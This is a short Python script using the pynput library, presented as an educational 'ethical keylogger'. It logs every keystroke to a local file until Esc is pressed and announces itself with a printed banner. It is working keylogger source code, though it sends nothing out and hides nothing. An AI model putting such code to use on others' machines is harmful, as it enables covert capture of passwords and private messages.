# Basic Ethical Keylogger (Educational Use Only)
# Author: Muhammad Atif
# Description: Logs keystrokes to a file in a safe, controlled environment.

from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Special keys (e.g., space, enter, shift)
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener when Esc is pressed
        return False

print("===== Ethical Keylogger (Test Environment Only) =====")
print("Press ESC to stop logging.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
